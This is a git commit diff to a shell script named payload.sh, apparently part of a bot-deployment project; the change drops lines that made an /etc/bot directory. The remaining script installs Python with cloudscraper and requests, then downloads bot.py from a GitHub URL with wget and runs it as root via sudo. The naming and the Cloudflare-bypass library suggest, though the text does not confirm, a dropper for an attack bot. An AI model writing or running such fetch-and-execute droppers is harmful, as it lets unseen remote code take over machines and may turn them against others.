227ae68cef96ace41b342e06ff8b60745c4d08da
oahwrd <stathread@proton.me>
2025-03-14 22:24:48 -0400

    Update payload.sh

--- src/Payload/payload.sh
+++ src/Payload/payload.sh
@@ -1,7 +1,4 @@
 sudo apt install python3 && sudo apt install python && yum install python3 && yum install python && pkg install python3 && pkg install python
 pip install cloudscraper requests && pip3 install cloudscraper requests
-cd /etc
-mkdir bot
-cd /etc/bot
 wget https://github.com/oahwrd/yuhyuh/edit/main/src/Payload/bot.py
 sudo python3 bot.py
